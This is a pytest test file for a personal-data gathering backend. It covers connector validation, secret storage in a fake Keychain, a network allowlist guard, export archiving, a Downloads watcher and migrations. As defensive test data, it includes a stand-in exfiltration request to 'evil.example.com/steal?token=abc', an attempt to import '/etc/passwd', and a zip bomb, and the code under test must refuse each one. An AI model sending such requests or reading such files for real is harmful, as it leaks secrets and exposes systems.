"""
DataGatherer core (backend/datagatherer/): the connector registry and its metadata rules,
secrets only in the (fake) Keychain, the network guard, the raw-export store (copy, never
overwrite, sha256 dedupe, existing folders in place), the Downloads watcher on a temp
folder, the opt-in schedules, the launchd agent in a temp folder, and migrations 60-61.

Nothing here reads real personal data, reaches the network, the real Keychain, the real
~/Downloads or ~/Library/LaunchAgents (conftest.datagatherer_sandbox).
"""
import json
import os
import plistlib
import sqlite3
import time
from pathlib import Path

import httpx
import pytest

from backend.datagatherer import (base, cards, daemon, keychain, launchd, net, raw_store, registry, state)
from backend.datagatherer.base import Connector, ExportKind, HelpOption
from fake_services import FakeSpotify, extended_play, write_export_zip


# ---------- registry ----------

def test_every_connector_has_valid_dutch_metadata():
    found = registry.connectors()
    assert {"spotify", "lastfm", "google_takeout"} <= {c.id for c in found}
    for connector in found:
        assert registry.validate(connector) == [], connector.id
        assert connector.help and connector.description.strip()
        if connector.has("api_sync"):
            assert connector.allowed_hosts and connector.setup is not None
            assert "wanneer jij klikt" in connector.network_label
        else:
            assert connector.network_label.startswith("Alleen lokaal")
    # Grouped by category in the fixed order
    order = [base.CATEGORIES.index(c.category) for c in found]
    assert order == sorted(order)


def test_the_template_connector_is_valid_and_not_loaded(tmp_path):
    from backend.datagatherer.connectors import _template
    assert registry.validate(_template.CONNECTOR) == []
    assert registry.get("voorbeeld") is None
    export = tmp_path / "ViewingActivity.csv"
    export.write_text("Title,Date\nFilm,2026-10-01\n")
    assert _template.CONNECTOR.detect(export, None) == "kijkgeschiedenis"
    (tmp_path / "other.csv").write_text("a,b\n")
    assert _template.CONNECTOR.detect(tmp_path / "other.csv", None) is None


class _Bad(Connector):
    id = "Bad Id"
    name = ""
    icon = "fa-spotify"
    category = "Overig"
    description = "x"
    capabilities = frozenset({"api_sync", "teleport"})
    allowed_hosts = ("https://api.example.com", "*.example.com")
    raw_folder = "a/b"
    exports = (ExportKind("x", "X", "http://example.com/", (), "X/Y"),)
    help = (HelpOption("Moeilijk", "moeilijk", ("a",)), HelpOption("Makkelijk", "makkelijk", ("b",)))


def test_a_broken_connector_is_refused_with_every_reason():
    problems = " | ".join(registry.validate(_Bad()))
    for expected in ("id 'Bad Id'", "name is empty", "icon", "category", "unknown capabilities",
                     "plain host name", "raw_folder", "request_url must be https", "folder_label",
                     "from easy to hard", "api_sync needs a setup"):
        assert expected in problems, expected
    with pytest.raises(registry.InvalidConnector):
        registry.register(_Bad())


def test_a_connector_without_hosts_may_not_sync_and_one_with_hosts_must_sync():
    class Local(Connector):
        id = "lokaal"
        name = "Lokaal"
        icon = "fas fa-laptop"
        category = "Activiteit"
        description = "Test"
        raw_folder = "Lokaal"
        capabilities = frozenset({"import"})
        allowed_hosts = ("example.com",)
        help = (HelpOption("Inlezen", "makkelijk", ("Kies een bestand",)),)
    assert any("only an api_sync connector" in p for p in registry.validate(Local()))
    Local.allowed_hosts = ()
    assert registry.validate(Local()) == []


# ---------- Keychain ----------

def test_secrets_live_only_in_the_fake_keychain_in_test_mode():
    import keyring
    keychain.set("spotify", "client_id", "abc")
    assert keychain.get("spotify", "client_id") == "abc"
    assert keyring.get_keyring().get_password("nl.datavault.datagatherer.spotify", "client_id") == "abc"
    assert keychain.delete("spotify", "client_id") is True
    assert keychain.delete("spotify", "client_id") is False
    # A real backend is replaced, never used, while DATAVAULT_TESTING=1
    keyring.set_keyring(keyring.backends.fail.Keyring())
    keychain.set("spotify", "x", "y")
    assert getattr(keyring.get_keyring(), "datavault_fake", False)


def test_secrets_are_never_echoed_or_stored_in_the_database(client, config):
    r = client.put("/api/datagatherer/sources/lastfm/secrets", json={"api_key": "geheim-123"})
    assert r.status_code == 200 and "geheim-123" not in r.text
    detail = client.get("/api/datagatherer/sources/lastfm").json()
    api_key = next(f for f in detail["settings"] if f["key"] == "api_key")
    assert api_key["stored"] is True and api_key["value"] is None
    assert "geheim-123" not in json.dumps(detail)
    with sqlite3.connect(str(config.DB_PATH)) as conn:
        dump = "\n".join(conn.iterdump())
    assert "geheim-123" not in dump
    assert client.put("/api/datagatherer/sources/lastfm/secrets", json={"wachtwoord": "x"}).status_code == 400
    # 'Vergeet dit account' removes it from the Keychain
    assert client.post("/api/datagatherer/sources/lastfm/forget").status_code == 200
    assert keychain.get("lastfm", "api_key") is None


# ---------- the network guard ----------

def test_a_locked_keychain_never_breaks_the_tab(client, app):
    """F-F4: a locked Keychain (or 'Weigeren' at its prompt) gives notes and 503s, never a 500."""
    import keyring
    from keyring.backend import KeyringBackend
    from keyring.errors import KeyringLocked

    class LockedKeyring(KeyringBackend):
        priority = 1
        datavault_fake = True

        def get_password(self, service, username):
            raise KeyringLocked("locked")

        def set_password(self, service, username, password):
            raise KeyringLocked("locked")

        def delete_password(self, service, username):
            raise KeyringLocked("locked")

    keyring.set_keyring(LockedKeyring())
    r = client.get("/api/datagatherer/sources")
    assert r.status_code == 200
    spotify = next(c for c in r.json()["sources"] if c["id"] == "spotify")
    assert spotify["keychain_available"] is False and spotify["primary"]["action"] != "sync"
    assert "Sleutelhanger" in spotify["notes"][0]["text"]
    google = next(c for c in r.json()["sources"] if c["id"] == "google_takeout")
    assert google["keychain_available"] is True
    detail = client.get("/api/datagatherer/sources/spotify")
    assert detail.status_code == 200 and detail.json()["keychain_available"] is False
    assert client.get("/api/datagatherer/sources/lastfm").status_code == 200
    assert client.post("/api/datagatherer/sources/spotify/sync").status_code == 503
    assert client.post("/api/datagatherer/sources/spotify/connect").status_code == 503
    assert client.post("/api/datagatherer/sources/spotify/forget").status_code == 503
    assert client.put("/api/datagatherer/sources/lastfm/secrets", json={"api_key": "x"}).status_code == 503


def _guard_client(db, connector_id="spotify", trigger="user"):
    return net.client(db, registry.get(connector_id), trigger)


def test_the_guard_refuses_other_hosts_plain_http_and_no_trigger_and_logs_it(app, client):
    db = app.state.db
    fake = FakeSpotify()
    net.set_transport_factory(lambda: httpx.MockTransport(fake.handler))
    with _guard_client(db) as http:
        with pytest.raises(net.NetworkRefused, match="niet in de lijst"):
            http.get("https://evil.example.com/steal?token=abc")
        with pytest.raises(net.NetworkRefused, match="Alleen https"):
            http.get("http://api.spotify.com/v1/me")
        assert http.get("https://api.spotify.com/v1/me/player/recently-played?limit=50").status_code == 401
    with _guard_client(db, trigger="local") as http:
        with pytest.raises(net.NetworkRefused, match="klik of schema"):
            http.get("https://api.spotify.com/v1/me")
    # A redirect is a new request through the same guard
    def redirect(request):
        return httpx.Response(302, headers={"Location": "https://elders.example.org/x"})
    net.set_transport_factory(lambda: httpx.MockTransport(redirect))
    with net.client(db, registry.get("spotify"), "user") as http:
        http.follow_redirects = True
        with pytest.raises(net.NetworkRefused):
            http.get("https://api.spotify.com/v1/x")
    assert not any(r.url.host == "evil.example.com" for r in fake.requests)
    log = client.get("/api/datagatherer/network-log").json()["entries"]
    outcomes = [(e["host"], e["outcome"]) for e in log]
    assert ("evil.example.com", "refused") in outcomes and ("api.spotify.com", "http_error") in outcomes
    assert ("elders.example.org", "refused") in outcomes
    assert all("token=" not in (e["path"] or "") and "?" not in (e["path"] or "") for e in log)
    assert {e["source_name"] for e in log} == {"Spotify"}


def test_a_scheduled_request_needs_the_schedule_switched_on(app, client):
    db = app.state.db
    fake = FakeSpotify()
    net.set_transport_factory(lambda: httpx.MockTransport(fake.handler))
    with _guard_client(db, trigger="schedule") as http:
        with pytest.raises(net.NetworkRefused, match="schema van deze bron staat uit"):
            http.get("https://api.spotify.com/v1/me")
    client.put("/api/datagatherer/sources/spotify/settings", json={"schedule_enabled": True})
    with _guard_client(db, trigger="schedule") as http:
        assert http.get("https://api.spotify.com/v1/me").status_code == 404
    assert len(fake.requests) == 1


def test_tests_never_reach_the_real_network(app):
    with _guard_client(app.state.db) as http:
        with pytest.raises(net.NetworkRefused, match="testmodus"):
            http.get("https://api.spotify.com/v1/me")


# ---------- the raw-export store ----------

def _zip(tmp_path, name="my_spotify_data.zip"):
    return write_export_zip(tmp_path / "Downloads" / name, extended=[extended_play(1.7e9, "T", "A", uri="spotify:track:1")])


def test_an_export_is_copied_never_moved_and_never_stored_twice(app, config, tmp_path):
    db = app.state.db
    connector = registry.get("spotify")
    src = _zip(tmp_path)
    before = (src.read_bytes(), src.stat().st_mtime_ns)
    raw, created = raw_store.archive_file(config, db, connector, "extended", src, "downloads")
    assert created and raw["status"] == "pending" and raw["origin"] == "downloads"
    copy = Path(raw["path"])
    today = time.strftime("%Y-%m-%d")
    assert copy == config.VAULT_ROOT / "data" / "Matthew" / "Spotify" / f"{today} Extended streaming history" / src.name
    assert copy.read_bytes() == before[0] and copy.stat().st_mtime_ns == before[1]
    assert (src.read_bytes(), src.stat().st_mtime_ns) == before          # the original is untouched
    manifest = json.loads((copy.parent / "datavault-import.json").read_text())
    assert manifest["sha256"] == raw["sha256"] and manifest["original_path"] == str(src)
    # The same bytes again (another name, another day): no second copy
    again = tmp_path / "Downloads" / "my_spotify_data (1).zip"
    again.write_bytes(src.read_bytes())
    raw2, created2 = raw_store.archive_file(config, db, connector, "extended", again, "downloads")
    assert not created2 and raw2["id"] == raw["id"]
    assert sorted(p.name for p in copy.parent.iterdir()) == ["datavault-import.json", src.name]


def test_the_same_export_stored_at_the_same_time_is_copied_once(app, config, tmp_path):
    """F-F2: three uploads of the same bytes at once give one copy, one manifest and one row."""
    import threading
    db = app.state.db
    connector = registry.get("spotify")
    src = _zip(tmp_path)
    copies = []
    for n in range(3):
        copy = tmp_path / f"up{n}" / "race.zip"
        copy.parent.mkdir()
        copy.write_bytes(src.read_bytes())
        copies.append(copy)
    results, errors = [], []

    def store(path):
        try:
            results.append(raw_store.archive_file(config, db, connector, "extended", path, "upload",
                                                  original_name="race.zip"))
        except Exception as e:  # pragma: no cover - the failure this test is about
            errors.append(e)

    threads = [threading.Thread(target=store, args=(c,)) for c in copies]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert errors == []
    assert sorted(created for _, created in results) == [False, False, True]
    assert len({raw["id"] for raw, _ in results}) == 1
    folder = Path(results[0][0]["path"]).parent
    assert sorted(p.name for p in folder.iterdir()) == ["datavault-import.json", "race.zip"]


def test_a_new_export_with_a_taken_name_never_overwrites(app, config, tmp_path):
    db = app.state.db
    connector = registry.get("spotify")
    first = _zip(tmp_path)
    raw1, _ = raw_store.archive_file(config, db, connector, "extended", first, "downloads")
    other = write_export_zip(tmp_path / "elders" / first.name,
                             extended=[extended_play(1.71e9, "Ander", "B", uri="spotify:track:2")])
    raw2, created = raw_store.archive_file(config, db, connector, "extended", other, "downloads")
    assert created and raw2["path"] != raw1["path"]
    assert Path(raw2["path"]).name == "my_spotify_data 2.zip"
    assert Path(raw1["path"]).read_bytes() == first.read_bytes()
    assert (Path(raw1["path"]).parent / "datavault-import 2.json").is_file()
    assert not list(Path(raw1["path"]).parent.glob(".*partial*"))


def test_existing_folders_are_registered_in_place(app, config, vault):
    db = app.state.db
    connector = registry.get("spotify")
    from backend.datagatherer.base import GatherContext
    gctx = GatherContext(config, db, connector)
    folder = vault / "data" / "Matthew" / "Spotify Extended Streaming History"
    assert connector.find_existing(gctx) == [(folder, "extended")]
    files_before = sorted((p.name, p.stat().st_mtime_ns) for p in folder.iterdir())
    raw, changed = raw_store.register_folder(config, db, connector, "extended", folder, connector.folder_patterns)
    assert changed and raw["is_folder"] and raw["origin"] == "existing" and raw["path"] == str(folder)
    assert raw_store.register_folder(config, db, connector, "extended", folder, connector.folder_patterns)[1] is False
    (folder / "Streaming_History_Audio_2024.json").write_text("[]")
    raw2, changed2 = raw_store.register_folder(config, db, connector, "extended", folder, connector.folder_patterns)
    assert changed2 and raw2["id"] == raw["id"] and raw2["status"] == "pending"
    assert sorted(p.name for p in folder.iterdir()) == sorted([n for n, _ in files_before] + ["Streaming_History_Audio_2024.json"])
    # RAW_google is registered in place by the Takeout connector
    google = registry.get("google_takeout")
    (vault / "data" / "Matthew" / "RAW_google" / "Takeout 1" / "Takeout" / "Mijn activiteit").mkdir(parents=True)
    assert google.find_existing(GatherContext(config, db, google)) == [(vault / "data" / "Matthew" / "RAW_google", "takeout")]


def test_the_owner_folder_comes_from_config_or_the_first_folder(config, vault, tmp_path):
    assert raw_store.owner_folder(config) == vault / "data" / "Matthew"
    config.DATA_OWNER = "Iemand"
    assert raw_store.owner_folder(config) == vault / "data" / "Iemand"


def test_reading_a_zip_never_unpacks_and_refuses_a_bomb(tmp_path, monkeypatch):
    import zipfile
    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Streaming_History_Audio_x.json", b"[" + b" " * (60 * 1024 * 1024) + b"]")
    items = list(raw_store.iter_export_files(bomb, lambda n: True))
    with pytest.raises(raw_store.RawStoreError):
        items[0][1]()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["bomb.zip"]


# ---------- the Downloads watcher ----------

@pytest.fixture
def downloads(app, config, tmp_path):
    """A temp 'Downloads' as the only watch folder (of the app's config and the test's own)."""
    folder = tmp_path / "Downloads"
    folder.mkdir(exist_ok=True)
    config.GATHER_WATCH_FOLDERS = [folder]
    app.state.config.GATHER_WATCH_FOLDERS = [folder]
    return folder


def test_the_watcher_only_looks_while_an_export_is_requested(app, client, downloads):
    db, config = app.state.db, app.state.config
    gather = daemon.Daemon(config, db, lambda: app.state.jobs)
    zip_path = _zip(downloads.parent)
    os.utime(zip_path, (time.time() - 3600, time.time() - 3600))
    assert gather.tick() == {"watch": [], "sync": []}
    client.post("/api/datagatherer/sources/spotify/request-export", json={"kind": "extended"})
    started = gather.tick()
    assert started["watch"] == [str(zip_path)]
    jobs = app.state.jobs
    watch_job = next(j for j in jobs.list(10) if j["type"] == "datagatherer.watch")
    assert jobs.wait(watch_job["id"], timeout=20)["status"] == "done"
    import_job = next(j for j in jobs.list(10) if j["type"] == "datagatherer.import.spotify")
    assert jobs.wait(import_job["id"], timeout=20)["status"] == "done"
    assert zip_path.is_file()                                  # never moved or deleted
    card = client.get("/api/datagatherer/sources").json()["sources"]
    spotify = next(c for c in card if c["id"] == "spotify")
    assert spotify["open_request"] is None
    assert any("mag je weggooien" in n["text"] for n in spotify["notes"])
    # The same file is not started again
    assert gather.tick()["watch"] == []


def test_the_watcher_skips_unfinished_downloads_and_waits_for_a_stable_size(app, config, downloads):
    db = app.state.db
    connector = registry.get("spotify")
    state.open_request(db, "spotify", "extended", None)
    (downloads / "my_spotify_data.zip.crdownload").write_bytes(b"PK\x03\x04 half")
    partial = _zip(downloads.parent, "my_spotify_data (2).zip")
    (downloads / "my_spotify_data (2).zip.part").write_bytes(b"")      # Firefox: still downloading
    fresh = _zip(downloads.parent, "fresh.zip")
    now = time.time()
    os.utime(fresh, (now, now))
    assert daemon.candidates(config, db, connector, now) == []         # first look: not stable yet
    found = daemon.candidates(config, db, connector, now + 30)          # same size and mtime: stable
    assert [c["name"] for c in found] == ["fresh.zip"]
    # Recognised by content, not by name: a zip without Spotify history is ignored
    other = downloads / "my_spotify_data_vakantiefotos.zip"
    import zipfile
    with zipfile.ZipFile(other, "w") as zf:
        zf.writestr("foto.jpg", b"jpg")
    os.utime(other, (now - 3600, now - 3600))
    assert "my_spotify_data_vakantiefotos.zip" not in [c["name"] for c in daemon.candidates(config, db, connector, now + 60)]
    assert partial.is_file()


@pytest.mark.parametrize("first", ["google_takeout", "spotify"])
def test_each_source_recognises_its_own_export_whoever_looks_first(app, client, config, downloads, first):
    """UX-1: what one connector's detect() said is never reused for another connector."""
    import zipfile
    db = app.state.db
    spotify_zip = _zip(downloads.parent)
    takeout = downloads / "takeout-20261028T120000Z-001.zip"
    with zipfile.ZipFile(takeout, "w") as zf:
        zf.writestr("Takeout/Mijn activiteit/Zoeken/MijnActiviteit.json", "[]")
    old = time.time() - 3600
    for path in (spotify_zip, takeout):
        os.utime(path, (old, old))
    order = [first] + [s for s in ("google_takeout", "spotify") if s != first]
    found = {s: [c["name"] for c in daemon.candidates(config, db, registry.get(s))] for s in order}
    assert found == {"spotify": [spotify_zip.name], "google_takeout": [takeout.name]}
    # The watcher with both exports requested starts each file for its own source only
    state.open_request(db, "spotify", "extended", None)
    state.open_request(db, "google_takeout", "takeout", None)
    daemon.forget_seen()
    started = daemon.Daemon(config, db, lambda: app.state.jobs).tick()["watch"]
    assert sorted(started) == sorted([str(spotify_zip), str(takeout)])
    watch = [j for j in app.state.jobs.list(20) if j["type"] == "datagatherer.watch"]
    assert sorted((j["params"]["source"], Path(j["params"]["path"]).name) for j in watch) == [
        ("google_takeout", takeout.name), ("spotify", spotify_zip.name)]
    for job in watch:
        assert app.state.jobs.wait(job["id"], timeout=20)["status"] == "done"


def test_the_real_downloads_folder_is_never_watched_in_test_mode(config, tmp_path, monkeypatch):
    config.GATHER_WATCH_FOLDERS = None
    assert daemon.watch_folders(config) == []
    config.GATHER_WATCH_FOLDERS = [Path.home() / "Downloads"]
    assert daemon.watch_folders(config) == []
    # Outside test mode: ~/Downloads (a fake home here) plus the configured extra folders
    monkeypatch.setenv("DATAVAULT_TESTING", "0")
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    (tmp_path / "Downloads").mkdir()
    (tmp_path / "Dropbox").mkdir()
    config.GATHER_WATCH_FOLDERS = [tmp_path / "Dropbox", tmp_path / "bestaat-niet"]
    assert daemon.watch_folders(config) == [tmp_path / "Downloads", tmp_path / "Dropbox"]


def test_only_a_reported_candidate_can_be_imported(client, downloads):
    zip_path = _zip(downloads.parent)
    os.utime(zip_path, (time.time() - 3600, time.time() - 3600))
    found = client.get("/api/datagatherer/sources/spotify/candidates").json()
    assert [c["name"] for c in found["candidates"]] == [zip_path.name]
    assert client.post("/api/datagatherer/sources/spotify/candidates/import",
                       json={"path": "/etc/passwd"}).status_code == 404
    r = client.post("/api/datagatherer/sources/spotify/candidates/import", json={"path": str(zip_path)})
    assert r.status_code == 201 and r.json()["job"]["type"] == "datagatherer.watch"


# ---------- schedules ----------

def test_schedules_are_off_by_default_and_run_only_when_switched_on(app, client, config):
    db = app.state.db
    gather = daemon.Daemon(config, db, lambda: app.state.jobs)
    keychain.set("lastfm", "api_key", "k")
    client.put("/api/datagatherer/sources/lastfm/settings", json={"settings": {"username": "iemand"}})
    assert client.get("/api/datagatherer/sources").json()["sources"][0]["schedule"]["enabled"] is False
    assert gather.tick()["sync"] == []
    client.put("/api/datagatherer/sources/lastfm/settings", json={"schedule_enabled": True, "schedule_minutes": 30})
    now = time.time()
    assert gather.schedule_tick(now) == ["lastfm"]
    assert gather.schedule_tick(now + 60) == []                        # not before the interval
    state.update(db, "lastfm", retry_after=now + 4000)
    assert gather.schedule_tick(now + 1900) == []                      # Retry-After is respected
    state.update(db, "lastfm", retry_after=None, needs_reconnect=1)
    assert gather.schedule_tick(now + 1900) == []                      # must be connected again first
    assert client.put("/api/datagatherer/sources/google_takeout/settings",
                      json={"schedule_enabled": True}).status_code == 400
    assert client.put("/api/datagatherer/sources/lastfm/settings", json={"schedule_minutes": 1}).status_code == 400


# ---------- launchd ----------

def test_the_launchd_agent_is_written_to_a_temp_folder_and_removed_only_if_ours(client, tmp_path, datagatherer_sandbox):
    status = client.get("/api/datagatherer/launchd").json()
    assert status["installed"] is False and str(tmp_path) in status["path"]
    r = client.post("/api/datagatherer/launchd/install")
    assert r.status_code == 200 and r.json()["installed"] is True
    plist = plistlib.loads(Path(status["path"]).read_bytes())
    assert plist["Label"] == launchd.LABEL and plist["StartInterval"] == 1800
    assert plist["ProgramArguments"][1:4] == ["-m", "backend.datagatherer.cli", "sync"]
    assert any(args[0] == "bootstrap" for args in datagatherer_sandbox)
    assert client.post("/api/datagatherer/launchd/install").status_code == 200   # same file: fine
    assert client.post("/api/datagatherer/launchd/uninstall").json()["installed"] is False
    assert not Path(status["path"]).exists()
    # Someone else's file with our name is never removed
    Path(status["path"]).write_bytes(plistlib.dumps({"Label": "com.example.other"}))
    assert client.post("/api/datagatherer/launchd/uninstall").status_code == 409
    assert Path(status["path"]).exists()


def test_launchd_never_touches_the_real_launch_agents_in_test_mode(monkeypatch):
    monkeypatch.delenv("DATAVAULT_LAUNCH_AGENTS_DIR")
    with pytest.raises(launchd.LaunchdError):
        launchd.agents_dir()
    monkeypatch.setenv("DATAVAULT_LAUNCH_AGENTS_DIR", str(Path.home() / "Library" / "LaunchAgents"))
    with pytest.raises(launchd.LaunchdError):
        launchd.plist_path()
    launchd.set_runner(None)
    with pytest.raises(launchd.LaunchdError):
        launchd._launchctl(["list"])


def test_the_launchd_command_syncs_only_scheduled_sources(app, client, config_file):
    """What the agent runs (cli.py): a scheduled sync without the server, through the same guard."""
    from backend.datagatherer import cli
    from fake_services import FakeLastFm
    fake = FakeLastFm([(1_700_000_000 + i * 300, "Band", f"Nummer {i}") for i in range(3)])
    net.set_transport_factory(lambda: httpx.MockTransport(fake.handler))
    keychain.set("lastfm", "api_key", "k")
    client.put("/api/datagatherer/sources/lastfm/settings", json={"settings": {"username": "iemand"}})
    assert cli.main(["sync", "--config", str(config_file)]) == 0
    assert fake.requests == []                                    # schedule off: nothing
    client.put("/api/datagatherer/sources/lastfm/settings", json={"schedule_enabled": True})
    assert cli.main(["sync", "--config", str(config_file)]) == 0
    assert len(fake.requests) == 1
    log = client.get("/api/datagatherer/network-log?source=lastfm").json()["entries"]
    assert [e["trigger"] for e in log] == ["schedule"]


# ---------- migrations 60 and 61 ----------

def test_migrations_60_61_add_tables_and_keep_every_user_row(tmp_path, monkeypatch):
    from backend import migrations
    from backend.database import Database
    from test_duplicates_runs import _migrate_to
    from test_foundation import _make_legacy_db
    db_path = tmp_path / "datavault.db"
    _make_legacy_db(db_path)
    _migrate_to(db_path, 12, monkeypatch)
    now = time.time()
    with sqlite3.connect(str(db_path)) as conn:
        conn.execute("INSERT INTO keurer_decisions (path, folder, decision, dest_path, dest_ino, dest_size) "
                     "VALUES ('/v/RAW/weg.jpg', '/v/RAW', 'delete', '/v/TRASH/weg.jpg', 77, 1234)")
        conn.execute("INSERT INTO app_settings VALUES ('chat_model', '\"qwen2.5:3b\"', 5.0)")
        conn.execute("INSERT INTO jobs (type, params, status, processed, created_at, updated_at, checkpoint) "
                     "VALUES ('index', '{\"full\": true}', 'paused', 12, ?, ?, '{\"folder\": 3}')", (now, now))
        conn.execute("INSERT INTO media (path, folder, name, kind, ext, size, mtime_ns, added_at, indexed_at, seen_at) "
                     "VALUES ('/v/RAW/a.jpg', '/v/RAW', 'a.jpg', 'photo', '.jpg', 10, 1, 1, 1, 1)")
        conn.execute("INSERT INTO recovery_actions (kind, title, created_at) VALUES ('viewer_move', 'x', 1)")
        conn.execute("INSERT INTO recovery_moves (action_id, src_path, dst_path, moved_at) VALUES (1, '/v/a', '/v/b', 1)")
        tables = [r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type = 'table' AND name != 'schema_version'")]
        before = {t: conn.execute(f"SELECT * FROM {t} ORDER BY 1").fetchall() for t in tables}
    assert before["sqlite_sequence"] and before["recovery_moves"] and before["keurer_decisions"]

    db = Database(db_path)
    with sqlite3.connect(str(db_path)) as conn:
        assert migrations.get_schema_version(conn) == migrations.LATEST_VERSION >= 61
        for table, rows in before.items():
            assert conn.execute(f"SELECT * FROM {table} ORDER BY 1").fetchall() == rows, table
        names = {r[0] for r in conn.execute("SELECT name FROM sqlite_master")}
        assert {"dg_connectors", "dg_raw_imports", "dg_cursors", "dg_requests", "dg_network_log",
                "spotify_plays", "spotify_api_plays", "spotify_plays_merged"} <= names
        assert conn.execute("PRAGMA integrity_check").fetchone()[0] == "ok"
    assert len(list((tmp_path / migrations.BACKUP_DIR_NAME).glob("datavault-v12-*.db"))) == 1
    assert db.get_rating("/v/RAW/a.jpg") == 1150
    assert db.get_keurer_stats()["streak"] == 3
    assert db.get_delete_operations("run-1")[0]["dst_path"] == "/v/RAW_DUPLICATES/b.jpg"
    assert db.get_recent_keurer_decisions(1)[0]["dest_ino"] == 77
    assert db.get_setting("chat_model") == "qwen2.5:3b"
    assert db.get_recovery_moves(1)[0]["dst_path"] == "/v/b"
    # The new tables work
    state.update(db, "spotify", schedule_enabled=1)
    assert state.schedule_enabled(db, "spotify")
    db.close_all()


def test_migration_numbers_stay_sorted_and_unique():
    from backend import migrations
    numbers = [m[0] for m in migrations.MIGRATIONS]
    assert numbers == sorted(set(numbers))
    assert {60, 61} <= set(numbers)


# ---------- the tab's API ----------

def test_the_sources_list_builds_cards_from_metadata(client):
    data = client.get("/api/datagatherer/sources").json()
    # The categories that have a source, in the fixed order (more sources come with every step)
    from backend.datagatherer.base import CATEGORIES
    assert {"Muziek", "Berichten", "Sociaal", "Activiteit", "Locatie"} <= set(data["categories"])
    assert data["categories"] == [c for c in CATEGORIES if c in data["categories"]]
    assert data["owner_folder"].endswith("/data/Matthew")
    spotify = next(s for s in data["sources"] if s["id"] == "spotify")
    # The existing export folder is there but not read yet: the one button says Inlezen
    assert spotify["status"] == "export_binnen" and spotify["primary"]["action"] == "import"
    assert spotify["primary"]["label"] == "Inlezen" and "Inlezen" in spotify["next_step"]
    assert {a["action"] for a in spotify["actions"]} >= {"connect", "request_export", "find_downloads", "upload"}
    assert spotify["network"]["hosts"] == ["accounts.spotify.com", "api.spotify.com"]
    assert spotify["schedule"] == {"available": True, "enabled": False, "minutes": 30, "launchd": True}
    lastfm = next(s for s in data["sources"] if s["id"] == "lastfm")
    assert lastfm["primary"]["action"] == "connect" and lastfm["status"] == "niet_ingesteld"
    google = next(s for s in data["sources"] if s["id"] == "google_takeout")
    assert google["network"]["local"] is True and google["primary"]["action"] == "request_export"


def test_request_export_returns_the_page_and_steps_and_can_be_dismissed(client):
    r = client.post("/api/datagatherer/sources/spotify/request-export", json={"kind": "extended"}).json()
    assert r["url"] == "https://www.spotify.com/account/privacy/" and len(r["steps"]) >= 4
    assert r["card"]["status"] == "export_binnen" or r["card"]["open_request"]["kind"] == "extended"
    google = client.post("/api/datagatherer/sources/google_takeout/request-export", json={}).json()
    assert google["card"]["status"] == "wacht_op_export" and google["card"]["primary"]["action"] == "find_downloads"
    assert "Export aangevraagd" in google["card"]["next_step"]
    card = client.post(f"/api/datagatherer/requests/{google['request_id']}/dismiss").json()
    assert card["open_request"] is None
    assert client.post("/api/datagatherer/sources/spotify/request-export", json={"kind": "nope"}).status_code == 400
    assert client.post("/api/datagatherer/sources/lastfm/request-export", json={}).status_code == 400


def test_unknown_sources_and_bad_settings_are_refused(client):
    assert client.get("/api/datagatherer/sources/nope").status_code == 404
    assert client.put("/api/datagatherer/sources/lastfm/settings", json={"settings": {"x": 1}}).status_code == 400
    assert client.put("/api/datagatherer/sources/lastfm/settings", json={"settings": {"username": 5}}).status_code == 400
    assert client.post("/api/datagatherer/sources/lastfm/sync").status_code == 409   # not connected yet
    assert client.post("/api/datagatherer/sources/spotify/connect").status_code == 400  # no Client ID yet


def test_the_routes_need_the_session_token(anon_client):
    assert anon_client.post("/api/datagatherer/sources/spotify/sync").status_code == 403
    assert anon_client.put("/api/datagatherer/sources/lastfm/secrets", json={"api_key": "x"}).status_code == 403


def test_a_failed_sync_says_why_on_the_card_and_dates_read_dutch(client, app):
    """UX-5 and UX-8: the reason of a failed sync is in the next step; dates and waiting times read Dutch."""
    db = app.state.db
    keychain.set("lastfm", "api_key", "sleutel")
    client.put("/api/datagatherer/sources/lastfm/settings", json={"settings": {"username": "iemand"}})
    now = time.time()
    state.update(db, "lastfm", last_sync_at=now, last_success_at=now - 60,
                 last_error="De API-sleutel klopt niet: controleer hem bij Instellingen")
    cards = {c["id"]: c for c in client.get("/api/datagatherer/sources").json()["sources"]}
    lastfm = cards["lastfm"]
    assert lastfm["status"] == "fout" and lastfm["last_error"].startswith("De API-sleutel klopt niet")
    assert lastfm["next_step"].startswith("Bijwerken lukte de laatste keer niet")
    assert lastfm["primary"]["action"] == "sync"
    from backend.datagatherer.cards import _date, _expected
    assert _date(1_695_081_600) == "19 sep 2023"
    assert _expected(0, 2) == "meestal binnen 2 dagen" and _expected(1, 30) == "meestal binnen 1 tot 30 dagen"
    client.post("/api/datagatherer/sources/google_takeout/request-export", json={})
    google = next(c for c in client.get("/api/datagatherer/sources").json()["sources"] if c["id"] == "google_takeout")
    assert "meestal binnen 2 dagen klaar" in google["next_step"] and "0 tot" not in google["next_step"]
